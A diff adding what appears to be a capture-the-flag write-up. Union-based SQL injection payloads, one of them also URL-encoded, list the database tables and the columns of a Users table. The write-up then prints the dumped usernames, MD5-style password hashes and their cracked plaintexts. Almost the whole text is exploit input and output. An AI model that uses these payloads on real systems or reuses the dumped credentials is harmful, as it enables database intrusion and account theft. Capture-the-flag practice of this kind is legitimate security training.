@@ -1,0 +1,24 @@
+All the tables:
+```
+id=1 or 1=1 union Select 1,2,3,4,group_concat(0x7c,table_name,0x7C) from information_schema.tables
+```
+```
+%69%64%3d%31%20%6f%72%20%31%3d%31%20%75%6e%69%6f%6e%20%53%65%6c%65%63%74%20%31%2c%32%2c%33%2c%34%2c%67%72%6f%75%70%5f%63%6f%6e%63%61%74%28%30%78%37%63%2c%74%61%62%6c%65%5f%6e%61%6d%65%2c%30%78%37%43%29%20%66%72%6f%6d%20%69%6e%66%6f%72%6d%61%74%69%6f%6e%5f%73%63%68%65%6d%61%2e%74%61%62%6c%65%73
+```
+Found: Cars and Users
+
+All the columns of Users
+```
+id=1 or 1=1 union Select 1,2,3,4,group_concat(0x7c,column_name,0x7C) from information_schema.columns where table_name="Users"
+```
+Found: Username, Password
+
+Usernames found:
+|admin@cybercastors.com|,|admin@powerpuffgirls.com|,|jeff@homeaddress.com|,|moreusers@leakingdata.com|
+Passwords found:
+|cf9ee5bcb36b4936dd7064ee9b2f139e|,|fe87c92e83ff6523d677b7fd36c3252d|,|d1833805515fc34b46c2b9de553f599d|,|77004ea213d5fc71acf74a8c9c6795fb|
+
+Cracked passwords:
+```
+naruto, powerpuff, pancakes, fun
+```
